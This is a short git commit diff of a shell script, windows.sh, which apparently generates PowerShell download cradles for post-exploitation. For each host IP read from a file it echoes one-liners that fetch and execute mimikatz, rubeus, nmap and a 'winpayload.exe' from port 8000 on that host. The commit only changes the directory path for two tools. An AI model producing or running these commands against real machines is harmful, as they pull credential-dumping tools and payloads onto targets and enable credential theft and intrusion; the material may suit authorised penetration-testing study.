8a0f62cc7ed97804e8e1cca859f866faa2d66434
root <root@DATALINE.BTINTERNET>
2020-05-14 11:28:18 +0100

    df4fe557703be31b793e21df50ee64d7

--- windows.sh
+++ windows.sh
@@ -72,8 +72,8 @@ while read line
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/mimikatz64.exe')\"" 
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/mimikatz32.exe')\"" 
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/mimikatz32.exe')\"" 
-  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/rubeus.exe')\""
-    echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/nmap-setup.exe')\""
+  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/Executables/rubeus.exe')\""
+  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/Executables/nmap-setup.exe')\""
   echo "powershell \"iwr -Uri http://$line:8000/winpayload.exe -outfile winpayload.exe\""
 done < $filename
 echo ""
